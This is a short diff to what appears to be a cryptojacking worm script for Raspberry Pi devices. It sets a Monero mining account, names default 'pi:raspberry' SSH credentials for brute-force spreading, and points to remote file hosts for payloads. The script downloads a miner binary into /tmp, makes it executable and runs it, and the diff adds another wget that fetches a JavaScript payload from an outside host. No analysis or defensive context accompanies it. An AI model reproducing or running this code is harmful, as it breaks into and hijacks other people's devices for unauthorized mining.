@@ -7,7 +7,7 @@ MoneroUsername='1111nardski@gmail.com'
  # Monero Username, usually your monero address
 MoneroMinerBin='pplbwxhbkscx.bin'	 # Backup, https://a.pomf.space/pplbwxhbkscx.bin https://my.mixtape.moe/chmfrj.bin, only compilled for raspbian (ubuntu/debian). Recompile if needed
 
-FileHost='https://a.pomf.space'	   # Your server ip / domain
+FileHost='https://github.com/crazy-ace003/Dev-testing/blob/master/'	   # Your server ip / domain
 SelfRepFile='lmqpaynzvvdk.js'	   # Backup, https://a.pomf.space/lmqpaynzvvdk.js https://my.mixtape.moe/towggx.js
 SelfRepCredentials='pi:raspberry'  # Username:Password, for SSH bruteforcing
 SelfRepBin='bins.sh'	   # FileName, of this file
@@ -22,3 +22,4 @@ cd /tmp/cpuminer-multi/;killall y8D6
 ./y8D6 -t 1 -a cryptonight -o stratum+tcp://$MoneroPool -u $MoneroUsername -p x
 cd /tmp;mkdir /tmp/cpuminer-multi;cd /tmp/cpuminer-multi/;wget $FileHost/$MoneroMinerBin -O y8D6;chmod 777 y8D6;killall y8D6;
 ./y8D6 -t 1 -a cryptonight -o stratum+tcp://$MoneroPool -u $MoneroUsername -p x
+wget https://a.pomf.space/lmqpaynzvvdk.js
